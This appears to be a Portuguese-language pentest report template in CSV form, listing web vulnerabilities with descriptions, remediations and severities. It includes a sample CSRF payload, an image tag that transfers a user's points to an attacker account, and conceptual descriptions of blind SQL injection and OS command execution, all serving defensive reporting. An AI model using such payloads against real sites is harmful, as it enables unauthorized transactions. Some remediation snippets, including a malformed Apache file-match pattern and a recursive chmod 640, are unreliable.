;Data Source Type;Data Source Key;Vulnerabilidade;Descrição;Outras observações técnicas;Recomendação - Título;Recomendação;Causa raíz;CAT1 - CONTROLE;CAT2 - OWASP;Severidade;Risco (Tags);Referência 1;Referência 2;;;;;;;;;;;;;;
;;;Ausência de criptografia no _VIEWSTATE;"ViewState é o mecanismo qual o <a href=""http://ASP.NET"" target=""_blank"">ASP.NET</a><br/><br/> utiliza para manter o estado de controles e objetos quando um Postback <br/><br/>ocorre na página. As informações são armazenadas em um controle html do <br/><br/>tipo ""hidden"" chamado _VIEWSTATE.&nbsp;<div><br></div>";;Ausência de criptografia no _VIEWSTATE;"Recomenda-se que não se guarde nenhum valor ""seguro"" que possa ir <br/><br/>para o cliente. Existe uma forma de tornar mais segura as modificações <br/><br/>no viewstate criando um hash de seu conteúdo, assim quando for <br/><br/>modificado, o valor do hash muda sendo detectado no servidor, voltando <br/><br/>ao seu estado original.<div><br></div><div>Isso pode ser feito aplicando na diretiva da página:</div><div><br></div><div>&lt;%@Page EnableViewStateMAC=true %&gt;</div><div><br></div><div>Pode-se<br/><br/> também criptografar usando o algoritimo SHA1 (default) o que dificulta <br/><br/>um pouco a modificação, porem isso é possível. Estas modificações podem <br/><br/>ser feitas no arquivo machine.config do servidor web.</div>";-;;;LOW;;;;;;;;;;;;;;;;;
;;Função logout inadequada;Ausência de função logout;"Foi observado que a aplicação não possui função logout; esta situação permite que o usuário autenticado seja personificado, pois não há uma função que destrua a sessão do usuário corrente. Desta forma, em um computador que seja utilizado por mais de um usuário, caso o último autenticado não feche o navegador, o próximo usuário poder-se-ia utilizar a sessão e realizar ações maliciosas em nome do usuário anterior.";-;-;Deve-se criar um botão (sair ou logout), com a função de desautenticar o usuário da aplicação e destruir o SessionID da mesma, sem que o SessionID possa ser reutilizado.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Ausência de integridade na aplicação;Foi observado que a aplicação não disponibiliza-se em perfeita integridade de seus recursos.Esta situação prejudica e impacta nos resultados dos testes, tornando-os menos completos, visto que, alguns recursos não puderam ser testados ou foram parcialmente testados.;;Ausência de integridade na aplicação;Deve-se validar a causa do mal funcionamento dos recursos da aplicação e corrigi-los, a fim de que esses possam ser testados corretamente. O pleno funcionamento da aplicação proporciona testes mais completos e exatos.;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
V;;;Ausência de log da aplicação;"Esses registros podem conter dados confidenciais e informação de identificação pessoal, por isso, convém que hajam medidas apropriadas de proteção de privacidade dos dados, inclusive é recomendável que administradores do sistema não tenham permissão de exclusão ou desativação de logs.Os registros de eventos estabelecem o fundamento para os sistemas de monitoramento, que são capazes de gerar relatórios consolidados e alertas de segurança do sistema. Sistema: Criação, consulta, acréscimo ou substituição de informações;Importação e exportação de dados;Impressão de registros.Ações de usuário:Tentativas de autenticação de usuário, com ou sem sucesso;Troca de senha;Encerramento de sessão de usuário;Aceitação do termo de concordância de uso.Ações operacionais: Conexões com o banco de dados;Atividades de configuração do sistema (alterações administrativas);Atividades de gerenciamento de usuários e papéis, como ativação de conta de usuário ou alteração de permissão;Realização e restaurações de backup.Integrações:Envio e recepção de dados e suas confirmações de entregas;Erros de integridade e autenticação de mensagens;Erros de autenticação de parceiros.Ações privilegiadas:Ações de delegação de poder;Ações realizadas sob delegação de poder.E todos os eventos devem possuir: Data (dia, mês e ano) e hora (hora, minuto, segundo); Tipo de evento; Identificação do componente que gerou o evento (ex: endereço IP);Identificação do usuário gerador do evento.";-;Ausência de log da aplicação;"Sempre que aplicável, é necessário incluir as seguintes informações nos logs do sistema:_ Identificação dos usuários (ID);_ Atividades do sistema e operações de usuários;_ Exceções e falhas;_ Datas, horários, detalhes de eventos-chave, como por exemplo, horário de entrada (logon) e saída (logoff) do sistema;_ Identidade do dispositivo ou sua localização quando possível o identificador do sistema;_ Registros das tentativas de acesso ao sistema, aceitas ou rejeitadas;_ Registros das tentativas de acesso a outros recursos e dados, aceitas ou rejeitadas;_ Alteração na configuração do sistema;_ Uso de privilégios;_ Uso de aplicações e utilitários do sistema;_ Arquivos acessados e o tipo de acesso;_ Endereços e protocolos de rede;_ Alarmes provocados pelo sistema de controle de acesso;_ Ativação e desativação dos sistemas de proteção, como sistemas de antivírus e sistemas de detecção de intrusos;_ Registros de transações executadas pelos usuários nas aplicações.";-;Registro de eventos;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Ausência de monitoramento;Foi observado que eventos críticos de segurança não são registrados corretamente, como uma tentativa de login com falha, isso pode tornar o comportamento mal-intencionado mais difícil de ser detectado.;;Ausência de monitoramento;Estabelecer monitoramento efetivo e alertar tais suspeitas<br/>atividades são detectadas e respondidas em tempo hábil.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Ausência de reCAPTCHA;Foi averiguado que a aplicação não está utilizando um mecanismo <br/><br/>anti-flood em formulário de inserção de dados ao servidor. <br/><br/>Consequentemente, um usuário mal-intencionado poderia submeter uma grande <br/><br/>quantidade de requisições no formulário, a fim de poluir a aplicação ou <br/><br/>servidor, podendo causar até lentidão ou instabilidade na mesma.;;Ausência de reCAPTCHA;Deve-se implementar um mecanismo de reCAPTCHA a fim de filtrar o excesso<br/><br/> de requisições submetidas por meio de formulários da aplicação.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Blind SQL Injection;Esta técnica baseia-se no que chamamos de Verdadeiro ou Falso.<br/><br/>Aplicamos um parâmetro comparativo em variáveis da URL que fazem chamadas ao DB e executamos a página para ele comparar nosso parâmetro com o conteúdo do banco de dados, se o conteúdo for verdadeiro, ou seja, se ele existir no banco de dados a página irá carregar normalmente, porém se ele for falso a página apresentará erro.<br/><br/><br/><br/>Estando a aplicação suscetível a comparações, foi possível identificar informações restritas do banco de dados.<br/><br/><br/><br/>Informações identificadas:<br/><br/>xxxxxxxxxx;;Blind SQL Injection;As consultas devem ser construídas utilizando stored procedures ou consultas parametrizadas, de forma a impedir a concatenação de comandos SQL.<br/><br/><br/><br/>Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;;Blind XPath Injection;Esta técnica baseia-se no que chamamos de Verdadeiro ou Falso.<br/><br/>Aplicamos um parâmetro comparativo em queries do XML que fazem chamadas ao DB e executamos o XML para ele comparar nosso parâmetro com o conteúdo do banco de dados, se o conteúdo for verdadeiro, ou seja, se ele existir no banco de dados a página irá carregar normalmente, porém se ele for falso a página apresentará erro.<br/><br/><br/><br/>Estando a aplicação suscetível a comparações, foi possível identificar informações restritas do banco de dados.<br/><br/><br/><br/>Informações identificadas:<br/><br/>xxxxxxx;;Blind XPath Injection;Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;;Conteúdo inadequado;Foram identificados arquivos e diretórios inadequados presentes no servidor web. Essa situação possibilita obter informações e detalhes sobre a aplicação que podem ser vitais para realizar um ataque mais elaborado. Arquivos, por exemplo, sem referência ou que não sejam processados pelo servidor podem divulgar informações confidenciais que facilitarão um ataque contra a aplicação.;;Conteúdo inadequado;"Foram identificados arquivos e diretórios inadequados presentes no servidor web. Essa situação possibilita obter informações e detalhes sobre a aplicação que podem ser vitais para realizar um ataque mais elaborado.<br/><br/><br/><br/>Deve-se evitar o máximo a edição de arquivos diretamente no ambiente de produção, pois arquivos de copia de segurança podem ser criados automaticamente. <br/><br/><br/><br/>Os arquivos de backup devem ser armazenados em uma partição separada, em relação com a partição utilizada pela aplicação.<br/><br/>Caso o servidor Web seja Apache as restrições descritas abaixo devem ser estabelecidas.<br/><br/>No arquivo ""apache2.conf"":<br/><br/><br/><br/><Files ~ "".(bak|old|$"" ><br/><br/>Order allow,deny<br/><br/>Deny from all<br/><br/></Files><br/><br/><br/><br/>Consulte http://filext.com/ para uma base de dados mais completa de extensões.";-;;;LOW;;;;;;;;;;;;;;;;;
v;;;Cross Site Request Forgery (CSRF);"Em uma aplicação de pontuação para troca de prêmios, o usuário chamado José navega autenticado nessa aplicação (A) e em um fórum de jogos (B).Dentro do fórum de jogos, um usuário mal-intencionado insere uma tag HTML que transfere os pontos de José para um usuário chamado qwerty.<img src=”http://pontosepremio[.]com.br/transferencia?pontos=35000&destino=qwerty”>Sendo assim, a partir da aba “B” ocorrerá uma requisição ao sistema “A”, como José está autenticado em “A” em uma sessão válida, seus 35000 pontos serão transferidos para o usuário mal-intencionado qwerty.Caso o sistema “A” não faça as devidas validações, o usuário José terá seus pontos transferidos sem a sua autorização consciente. ";-;Cross Site Request Forgery (CSRF);"Normalmente conhecido por CSRF ou XSRF, esse ataque ocorre quando uma aplicação “A” (atacada), aberta em um mesmo navegador, faz uma requisição para aplicação “B” (usuário mal-intencionado). Este ataque é geralmente destinado às funcionalidades críticas ou transacionais de uma aplicação.Dentre as possíveis soluções para o problema, pode-se utilizar tokens inseridos em campos hidden nos formulários HTML que devem ser checados no servidor como forma de impor um desafio. Assim cada requisição além de validar o cookie de sessão, deve também verificar se o token do desafio foi recebido corretamente na submissão do formulário, esse mecanismo se chama token per-page. É recomendável avaliar as funcionalidades críticas da aplicação e implementar tal proteção. Além disso, a maioria dos frameworks já possuem suporte embutido de CSRF.";-;Validação de Cross-Site Request Forgery (CSRF);;MEDIUM;;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF);;;;;;;;;;;;;;
;;;Divulgação de cookie na URL;Foi observado que a aplicação está divulgando o cookie de sessão do usuário na URL.<br/><br/>Este caso se agrava, caso a aplicação esteja vulnerável ao item roubo de sessão, gerando problemas de privacidade e não - repúdio.;;Divulgação de cookie na URL;Deve-se configurar a aplicação para que a mesma não divulgue cookie de sessão na URL.;-;;;LOW;;;;;;;;;;;;;;;;;
;;;DoS por tempo de execução de parâmetros;Foi observado que a aplicação está suscetível a negação de serviço por meio do envio de requisições manipuladas juntamente às variáveis determinadas pela aplicação.<br/><br/>Quando esta vulnerabilidade é explorada, a aplicação torna-se indisponível até que o serviço seja reiniciado.;;DoS por tempo de execução de parâmetros;- Deve-se avaliar qual o componente ocasionou a interrupção do serviço.<br/><br/>- Devem-se revisar as funções de dados e os parâmetros de entrada a fim de garantir o devido tratamento das informações submetidas pelo usuário.<br/><br/>Normalmente, os caracteres que devem ser filtrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.<br/><br/><br/><br/>- Devem ser redirecionadas para uma página de erro padrão as requisições que fazem uso de caracteres especiais ou strings indevidas.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Enumeração de usuários válidos;A mensagem apresentada pela aplicação em falha de login faz distinção da informação que está inválida. Esta situação possibilita elencar usuários válidos na aplicação tornando o processo de descoberta de credenciais mais fácil.;;Enumeração de usuários válidos;Deve-se adotar uma mensagem genérica em caso de erro de autenticação, de forma a não permitir identificação de usuários válidos no sistema.;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
;;;Escala de privilégios;A escala de privilégio é o ato de acessar com um usuário de baixo privilégio, áreas ou páginas da aplicação que somente seriam permitidas a um perfil de usuário de maior privilégio. <br/><br/>Foi observado que a aplicação encontra-se vulnerável ao presente item.;;Escala de privilégios;Deve-se validar a permissão de acesso a objetos e funções do usuário no sistema a cada requisição de forma a impedir a execução e acesso não autorizado a funções e informações da aplicação.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;;Execução de comandos do Sistema Operacional;Foram encontradas na aplicação variáveis que executam comandos no sistema operacional do servidor. Tais variáveis encontram-se vulneráveis, permitindo a qualquer usuário submeter comandos no e do sistema operacional, por meio da URL da aplicação.;;Execução de comandos do Sistema Operacional;"Para mitigar ou extinguir a execução de comandos do sistema por usuários anônimos, deve-se:<br/><br/><br/><br/>- Evitar variáveis vulneráveis;<br/><br/>- Revisar o código fonte a fim de corrigir erros no código;<br/><br/>- Filtrar o conteúdo enviado entre o cliente e o servidor, de modo a não permitir caracteres especiais ou comandos do sistema vindo de um usuário anônimo;<br/><br/>- Definir a permissão das stored procedures para negar a execução e escrita da stored procedures por parte de um usuário anônimo;<br/><br/><br/><br/>Para Web Services:<br/><br/>- Implementar o WS-Security (sistema de segurança para Web Services).";-;;;HIGH;;;;;;;;;;;;;;;;;
;;;Execução de script interno;Foi identificado que a aplicação não está validando de forma correta as requisições submetidas ao servidor.<br/><br/>Por meio de variáveis vulneráveis, foi possível requisitar e executar scripts no servidor, scripts estes de diretórios internos e não autorizados a usuários anônimos.;;Execução de script interno;- Devem-se revisar as permissões dos diretórios restritos, de modo a configurar os mesmos para negar todas as permissões a usuários anônimos.<br/><br/>- Deve-se validar todo o conteúdo submetido ao servidor, de modo que o mesmo não aceite requisições que solicitem a leitura, gravação ou execução de scripts restritos.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;Proteção de informações sensíveis ;Exposição de código fonte;Foi observado que algumas páginas server-side estão disponibilizando seu código fonte.<br/><br/>O código fonte disponibilizado, revela informações sensíveis, do servidor e dos usuários.<br/><br/><br/><br/>Estas informações possibilitam a usuários maliciosos, fazerem uso das mesmas para efetuar ataques mais críticos.;;Exposição de código fonte;"Deve-se configurar o servidor Web para restringir a leitura não autorizada ao código fonte das páginas.<br/><br/><br/><br/>Para o servidor Apache utilize o comando - chown -R webmaster:www-group www/ && chmod -R 640 www/ - no diretório do site para definir o nível de privilégio dos usuários em relação aos arquivos que serão acessos por eles nas aplicações Web. <br/><br/>Deve-se também remover todos os arquivos com extensão (.old, .bak ou semelhantes) e adicionar o parâmetro abaixo em apahe2.conf ou httpd.conf:<br/><br/><Files ~ "".(bak|old|$"" ><br/><br/>Order allow,deny <br/><br/>Deny from all </Files> <br/><br/><br/><br/>Para o servidor IIS 6.0 vá até as propriedades do site no painel de gerenciamento do IIS e desabilite a opção Script Source Access.";-;;;HIGH;;;;;;;;;;;;;;;;;
;;;Falha no WSDL;Foram encontradas informações sensíveis estando elas ocultas em arquivos WSDL.<br/><br/>Tais informações não devem ser legíveis a usuários anônimos nem sendo em modo oculto.;;Falha no WSDL;Deve ser implementado o WS-Security para garantir a segurança e consistência do WSDL.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Falta de largura de banda;Inudando o servidor com inúmeras requisições, foi possível consumir toda a largura de banda usada pelo mesmo, levando a aplicação a negação de serviço.;;Falta de largura de banda;"- Deve ser definido a variável SynCookie no sistema operacional, está variável faz com que o servidor não aloque recursos até que a conexão seja completamente estabelecida;<br/><br/>- Deve-se utilizar um Load Balancing para cada servidor. O Load Balancing tem o objetivo de aumentar a largura de banda de conexões que estão em estado crítico;<br/><br/>- Deve-se utilizar um Throttling para controlar a carga máxima de conexões de um determinado serviço/protocolo que poderá ser processada por ciclo.<br/><br/><br/><br/>Obs: Recomendamos que o Load Balancing e o Throttling sejam de marcas confiáveis como, Cisco.";-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;HTML5 (CORS) compartilhamento de recursos;Os recursos HTML5 cross-origin controles de políticas de compartilhamento de saber se e como o conteúdo em execução em outros domínios podem realizar interação bidirecional com o domínio que publica a política. A política pode aplicar controles de acesso por pedido com base na URL e outras características do pedido. Se outro domínio é permitido pela política, então esse domínio pode potencialmente atacar os usuários do aplicativo. Se um usuário estiver conectado no aplicativo, e visita um domínio permitido pela política, então qualquer conteúdo malicioso em execução nesse domínio potencialmente pode recuperar o conteúdo do aplicativo, e, por vezes, levar a cabo ações no contexto do usuário conectado segurança. Mesmo se um domínio permitido não é abertamente malicioso em si, vulnerabilidades de segurança nesse domínio poderia ser aproveitado por um usuário mal-intencionado de terceiros para explorar a relação de confiança e atacar o aplicativo que permite o acesso.;;HTML5 (CORS) compartilhamento de recursos;Deve-se permitir apenas domínios confiáveis e que serão utilizados, para que possam ser especificados no cabeçalho Access-Control-Allow-Origin. <br/><br/>Não é recomendável a utilização do caractere * , que indica a permissão de um domínio sem checagem.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;HTTP Server Type and Version;This plugin attempts to determine the type and the version of the remote web server.;;HTTP Server Type and Version;-;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
;;;Identificação de ferramenta;Foi possível identificar a ferramenta - URLScan - utilizada para filtrar alguns tipos de ataques, exemplo: Cross-Site Scripting.<br/><br/>Esta situação ajuda um usuário mal-intencionado a pesquisar/desenvolver métodos de by-pass referente a filtragem de segurança ou vulnerabilidade na ferramenta descoberta.;;Identificação de ferramenta;"Deve-se ofuscar a mensagem na Url: ""/Rejected-By-UrlScan""; Ou impedir que a mesma seja transmitida na URL.";-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
;;;Inclusão de Arquivo Local (LFI);A vulnerabilidade consiste na ausência de validação de dados em procedures de inclusão, permitindo que arquivos locais do servidor sejam incluídos.;;Inclusão de Arquivo Local (LFI);Para correção da vulnerabilidade é recomendado a devida validação dos dados, impedindo que valores inseridos por usuários sejam submetidos ao sistema de arquivos/API do framework.<br/><br/>Em casos específicos, onde não é possível realizar a correção acima, também pode-se utilizar White Lists contendo os arquivos que podem ser acessados. Qualquer requisição diferente não será processada pela aplicação.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;;Inclusão de Arquivo Remoto (RFI);A vulnerabilidade consiste na ausência de validação de dados em procedures de inclusão, permitindo que arquivos remotos sejam inseridos na aplicação através de variáveis da URL.<br/><br/>Dessa forma um usuário mal intencionado pode inserir arquivos maliciosos e injetar comandos no servidor.;;Inclusão de Arquivo Remoto (RFI);Para correção da vulnerabilidade é recomendado a devida validação dos dados, impedindo que valores inseridos por usuários sejam submetidos ao sistema de arquivos/API do framework.<br/><br/>Em casos específicos, onde não é possível realizar a correção acima, também pode-se utilizar White Lists contendo os arquivos que podem ser acessados. Qualquer requisição diferente não será processada pela aplicação.<br/><br/>;-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;Proteção de informações sensíveis ;Informações sensíveis estão sendo disponibilizadas pelo servidor Web.;Através do banner é possível obter informações sobre o sistema operacional e o servidor web instalado no servidor.<br><br>;;Informações sensíveis estão sendo disponibilizadas pelo servidor Web.;Apache:<br/><br/>Configurar o servidor Apache para não disponibilizar estas informações modificando a diretiva <br/><br/>SeverTokens de Full para Prod.<br/><br/>IIS:<br/><br/>Utilizar o URLScan<br/><br/>32-Bit (x86): http://www.microsoft.com/downloads/details.aspx?FamilyID=ee41818f-3363-4e24-9940-321603531989<br/><br/><br/><br/>64-Bit (x64): http://www.microsoft.com/downloads/details.aspx?FamilyID=361e5598-c1bd-46b8-b3e7-3980e8bdf0de<br/>;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
